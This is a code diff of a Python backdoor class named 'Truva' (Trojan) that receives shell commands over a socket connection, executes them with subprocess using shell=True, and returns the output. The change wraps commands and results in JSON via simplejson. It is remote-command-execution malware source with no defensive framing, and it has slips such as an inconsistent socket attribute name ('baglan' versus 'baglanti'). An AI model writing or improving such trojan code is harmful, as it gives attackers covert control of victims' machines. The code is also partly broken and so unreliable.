@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import simplejson
 
 class Truva:
 
@@ -12,12 +13,24 @@ class Truva:
     def komut_isleme(self,komut):
         return subprocess.check_output(komut, shell=True)
 
+    def paketleme(self,veri):
+        paket = simplejson.dumps(veri)
+        self.baglanti.send(paket)
+
+    def paket_coz(self):
+        gelen_veri = ""
+        while True:
+            try:
+                gelen_veri = gelen_veri + self.baglan.recv(1024).decode("utf-8")
+                return simplejson.loads(gelen_veri)
+            except ValueError:
+                continue
 
     def baslatma(self):
         while True:
-            komut = self.baglanti.recv(1024).decode("utf-8")
+            komut = self.paket_coz()
             veri = self.komut_isleme(komut)
-            self.baglanti.send(veri)
+            self.paketleme(veri)
 
         self.baglanti.close()
 
